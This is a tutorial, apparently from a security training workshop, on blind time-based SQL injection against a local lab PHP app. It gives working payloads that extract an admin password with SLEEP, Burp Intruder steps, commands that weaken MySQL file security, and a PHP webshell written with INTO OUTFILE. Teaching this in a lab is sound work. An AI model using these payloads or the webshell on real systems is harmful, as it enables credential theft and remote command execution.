# Blind SQL Injection

This occurs where a user is in control of input which is directly used within an SQL query without adequate
validation or sanitisation. It is said to be blind because:

1) No error messages are visible when the SQL syntax is invalid. This limits the ease of exploitation significantly 
where the injection is into a complex SQL statement.
2) The SQL query is not used to build the HTML response page meaning that data extraction is not possible using the 
union select query as shown in the "Intro to SQL Injection".

Data extraction, as shown previously, relied on manipulating the result set to include useful data within a column which
was then echoed in the response page. Crucially that data was visible to you meaning it was not blind. 

## Blind SQL Injection Techniques

The challenge in blind injection is that error messages are not returned and content will not visibly be updated in most 
cases. This does not mean that data extraction is no longer possible. It simply takes a different set of techniques to 
get information.

To enable data extraction you will need to understand:

* String manipulation; and
* Logical manipulation to allow detectable differences. 

These are covered below.

## String manipulation

### Get Length of String

In MySQL you can use the "LENGTH" function to achieve this. 

The SYNTAX for this function and it being used in a SELECT statement has been provided below:

```sql
LENGTH( <string> )
SELECT LENGTH('abcdef');
```

The result to the example SELECT statement will be the number 6. This is useful to us because we need to loop through 
through each character in the data we want to extract and it helps to know when to stop!

### Get specific Character in a String

In MySQL you can use the "SUBSTRING" function to get a single character. This is the mechanism we use to enumerate each
character in a string:

```sql
SUBSTRING(string, start, length)
SELECT SUBSTRING('abcdef', 2, 1);
```

The result of the SELECT query will return the second character in the string which is 'b'.

### Determining the value of a specific character with STRCMP

To determine the value of a character we need to compare it with a value we know.

In MySQL the "STRCMP" (or String Compare) function is provided for this purpose. The following shows the SYNTAX and 
explains the various outputs

```sql
STRCMP(string1, string2)

MySQL strcmp() function is used to compare two strings. It returns 0 if both of the strings are same and returns -1 
when the first argument is smaller than the second according to the defined order and 1 when the second one is smaller 
the first one.
```

In this case if the answer is 0 the strings were equivalent and we can disregard any other result.

The following shows how to use STRCMP within SELECT statements:

```sql
SELECT STRCMP('a', 'a'); -- returns 0 because they are identical
SELECT STRCMP('a', 'b'); -- returns -1 because 'a' is alphabetically lower than 'b'
SELECT STRCMP('b', 'a'); -- returns 1 because 'b' is alphabetically higher than 'a'
```

While STRCMP works it requires a little clean up to make it evaluate as true or false. Use equals to compare the output
with the number 0:

```sql
SELECT (STRCMP('a', 'a')=0); -- returns 1 which equates to true.
SELECT (STRCMP('a', 'b')=0); -- returns 0 which equates to false.
```

When the strings are identical STRCMP returns 0 meaning comparison with 0 is logically correct.

### Determining the value of a specific character with equals

STRCMP has some logical challenges (which hopefully I just explained). But it is easy to forget. Therefore, most guides 
tell you to use the "CHAR" function to give you a single char to compare. A "String" is technically just a series of
individual char data types so this is very sensible. 

The following shows the syntax of the char object and how to use it in a SELECT query:

```sql
CHAR( ascii_number )
SELECT CHAR(97); -- returns the string 'a' 
```

The ascii code number 97 translates to a lowercase 'a' character. Executing the SELECT statement will return a result set
with a single row containing a string saying 'a'. 

You can compare a character to another using all simple logical operators:

* Less than - <
* Equals - =
* More than >

The following examples show how to use those operators and states the result

```sql
SELECT CHAR(97)='a'; -- returns in 1 meaning true
SELECT CHAR(96)>'a'; -- returns in 0 meaning false
SELECT CHAR(96)<'a'; -- returns in 1 menaing true
```

By allowing less than and greater than this technique can be used to find if a character is within a range. To do this 
the "ASCII" function can be used. This takes a string with a character inside of it and returns the ASCII number for it. 
It is the inverse of the "CHAR" function as shown above.

```sql
ASCII( string )
SELECT ASCII( 'a' ); -- returns the number 97
```

## Detectable Differences 

### If statement

In MySQL the "IF" function is used to evaluate an expression. An expression is something which equates to a boolean 
value which can be either "true" or "false". For example, is the number "1 equal to the number 2". That expression 
evaluates as "false". 

The "IF" function allows the developer to specify what happens when the expression is true, and what happens when it is
false.

The following shows the syntax along with an example using it in a SELECT statement:

```sql
IF(expression, true, false)
SELECT IF(1<2, 1, 2);
SELECT IF(2<1, 1, 2);
```

The result of the first expression, IF 1 is less than 2, is true. The result set is a row with the value "1".

The result of the second expression, IF 2 is less than 1, is false. The result set is a row with the value "2".

Using this we can trigger different responses where an expression is true or false.

### Delaying responses

Most databases support some functionality allowing a delay to be introduced in processing. This is useful where perhaps
a query needs to rely on a response from a different system for example. A delay in the HTTP response being returned
as a result of the database delay can be easily detected making it useful for exploiting SQL injection.

In MySQL the "SLEEP" function is used to delay a query. The syntax for this function and an example SELECT statement
have been provided below:

```sql
SLEEP( time_in_seconds )
SELECT SLEEP(1);
SELECT SLEEP(10);
```

These SELECT statements take 1 and 10 seconds respectively to be processed.

## Tying it together

You now know enough string manipulation to conduct data extraction. Go you!

The attack pattern is this:

1) Identify the length of a string you want to extract.
2) Loop through each character in that string (up to the length), and use comparisons to detect each character. 
3) Trigger a delay when the character has been detected. 
4) Extract the list of responses with long delays (true responses) and then reconstruct the data.

### Data extraction: Getting Admin User's Password

Target URL:

```
http://ubuntudevbox:8888/blind_injecting_into_string.php
```

From earlier exploits (see Intro video) we know that the "appdb" database contains a table called "users". In that table
we have three columns:

* id
* username; and
* password

We can extract this information blind using the techniques we are about to show combined with the Intro materials'
content around determining table and column names. I just do not want to repeat that process today.

We are going to extract the "admin" user's password from the database.

1. Determine the length of the admin user's password using the "LENGTH" function.

```sql
Is the password longer than 5 characters?
' UNION SELECT null,null,null FROM users WHERE username='admin' AND IF( LENGTH(password)>5, SLEEP(5), 'false') -- 
Is the password longer than 10 characters? 
' UNION SELECT null,null,null FROM users WHERE username='admin' AND IF( LENGTH(password)>10, SLEEP(5), 'false') -- 
Is the password less than 7 characters?
' UNION SELECT null,null,null FROM users WHERE username='admin' AND IF( LENGTH(password)<7, SLEEP(5), 'false') -- 
Is the password 6 characters long?
' UNION SELECT null,null,null FROM users WHERE username='admin' AND IF( LENGTH(password)=6, SLEEP(5), 'false') -- 
```

Result: Yes it is 6 characters long.

2. Get the first character of their password by triggering a delay. I tell you for free it begins with 's' to speed 
this along.

```sql
' UNION SELECT null,null,null FROM users WHERE username='admin' AND IF( SUBSTRING(password, 1, 1)='a', SLEEP(5), 'false') -- 
' UNION SELECT null,null,null FROM users WHERE username='admin' AND IF( SUBSTRING(password, 1, 1)='s', SLEEP(5), 'false') --
```

Comparing the first and second response time, there is a 5 second delay in responding to the second so we know the first
character was 's'. First character extracted. 

You can also extract the same information using the CHAR function as shown below:

```sql
' UNION SELECT null,null,null  FROM users WHERE username='admin' AND IF( SUBSTRING(password, 1, 1)=char(115), SLEEP(5), 'false') -- 
```

The ASCII number for 's' is 115 so the above will result in the 5 second delay. When doing automated extraction it is
probably easier to use this CHAR approach since you can exhaust the full range 0-256 easily. However, for this demo
we know the user's password is all lowercase a-z which is faster to show with that character set using strings and 
equals. Enjoy the demo? Try doing it using Char.
 
### Getting the gold using Burp Suite's Intruder like a boss!

Now all we really need to do is enumerate the full password by iterating through the admin user's password using 
"SUBSTRING".

* Open Burp & Firefox.
* In Burp, Start a temp project and accept all the prompts. Then disable interception which is enabled by default.
* In Firefox, set it to use burp as a proxy.
* In Firefox, browse to /blind_injecting_into_string.php URL.
    
    * Note: requests to localhost will bypass the proxy so visit the site using the hostname instead.
    
* In Firefox, Submit the form to make a request.
* In Burp on the "proxy" tab, find that most recent request. Right click and "send to repeater".
* In Burp find that repeater element and paste the encoded version below into the "name" parameter:

```sql
Encoded (paste this one):

%27+UNION+SELECT+null%2Cnull%2Cnull+FROM+users+WHERE+username%3D%27admin%27+AND+IF%28+SUBSTRING%28password%2C+1%2C+1%29%3D%27s%27%2C+SLEEP%285%29%2C+%27false%27%29+--+

Unencoded (because it is readable):

' UNION SELECT null,null,null FROM users WHERE username='admin' AND IF( SUBSTRING(password, 1, 1)='s', SLEEP(5), 'false') -- 
```

* In Burp repeater hit "send" and notice that the server response on the right hand side takes 5 seconds to return. At
this point we have enough to use Intruder to get our password!
* Right click on the request and use "sent to intruder" and goto the intruder tab.
* Goto the "positions" tab and click "Clear §" on the right hand side to remove the current selectd injection position.
* You want to find the start index part of the "SUBSTRING" function and apply a location marker using "add §" around 
the current argument '1'. Then do the same thing for the value being compared using the equals. At the end you should
have two marker locations as shown below:
 
```
SUBSTRING(password, §1§, 1)='§s§'
```

* Select "Cluster Bomb" as the attack type. This allows us to have different payload sets for each injection point.
* Move to the "payloads" screen. In the first injection location set "Payload Type" to numbers. Set the "From" as 1, the
"To" as 6 (the length of the guys password!), and use a step of 1. This means counting from 1 to 6 in steps of 1 and 
will iterate through the admin's password for us.
* In the second injection location we need to also set the "Payload Type" to "Simple List" and then select all lower 
case a-z as the set. I am doing this to keep the demo brief in reality you need to exhaust the full ASCII character set.
* Before running the intruder attack set it to use 1 thread only to avoid multiple threads affecting results.
* When the attack is finished add the "Response Received" column to the table view and sort descending so that the 
results with the longest responses are at the top. If you have response times way over 5 seconds then chances are you 
had too many threads running and that has affected the results, please try running it again. 
* Select all responses with less than second response times and right click to delete them. These are requests where the
probe was not the right answer so we can bin them.
* Sort by "payload 1" because this is the index of the password.
* Regard with delight the password coming from the results in "payload 2" column.

Demo over. *Back to slides.

## Webshell

Sadly my baseline docker LAMP stack I got from Docker Hub implements things very securely by default. So we have to 
do some work to lower its security first. Lets show how that goes.

MySQL by default now prevents insecure file reading and writing using the "secure_file_priv" variable. The only way
to disable this is to alter the config of mysql and restart the service.

To temporarily disable "secure_file_priv" enter the docker container:

```
docker ps # find the name for the container.
docker -it <container_name> /bin/bash
```

Then execute the commands shown below:

```bash
# change mysql config
echo "secure_file_priv=\"\"" >> /etc/mysql/mysql.conf.d/mysqld.cnf
# find and kill the mysql service 
ps -ef | grep mysql
kill -9 <mysql_safe>
kill -9 <mysqld>
# restart the service
/etc/init.d/mysql start
# Lets go nuts and change the permissions of the web root too
chmod 777 /var/www/html
```

Now we have updated our configuration, and made a common file permission mistake in the webroot. If you want to 
check that the setting has been applied, then use mysql as shown below:

```
mysql -u root 

SHOW VARIABLES LIKE 'secure_file_priv';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.01 sec)

```

The "INTO OUTFILE" SQL syntax can be used to write our webshell. Here is the generic example of the syntax:

```sql
SELECT 1 INTO OUTFILE '/tmp/file';
```

This would create "/tmp/file" which contained only the number 1. 

So that is file writing sorted! What should we use for our webshell? If you google "PHP webshell one liner" you will 
come across this one:

https://gist.github.com/sente/4dbb2b7bdda2647ba80b

```php
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

This is beautifully simple. The $_REQUEST collection allows you to access URL parameters by name. This script uses a 
parameter called "cmd" which, if it is present in the URL will be executed on the OS through the "system" function.

Now you know how to save a file, and the contents of the file that we need. The final hurdle is finding the correct 
folder to write content to. The "webroot" folder is where the web server loads content from which makes it accessible by
a URL. 

All HTTP server technologies have a default web root. Some have different ones on different operating systems. It is
also entirely possible for administrators to customise the default which makes it harder to exploit. The approach should 
always be:

1) Try to learn the technology stack used by the target. Review HTTP responses to check for the "Server:" header.
2) Pay attention to any verbose error messages. They frequently include the location on disk where the site is running. 
3) If you are targeting a product which has online support, you can generally find the answer in documentation.

In our case we know the target is running: Apache, on Ubuntu. That means the default path is ```/var/www/html```. We are
assuming that the administrator has not changed the default.

Finally, here is how to use the UNION select statement to write a webshell.

```
' UNION SELECT null,null,'<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' INTO OUTFILE '/var/www/html/shell.php' -- 
```

Tl;dr - make the webshell appear as a string in the UNION select and then write it into a file.

To access our webshell we now need to browse to the root of our site at "/shell.php".

## Web shell to reverse shell

The server has at least PHP and BASH available. Google "reverse shell one liners" and try them out here.

If you get a shell I'd love to share the joy if you want to drop a screenshot to me on Twitter @Cornerpirate.

Thanks for playing along.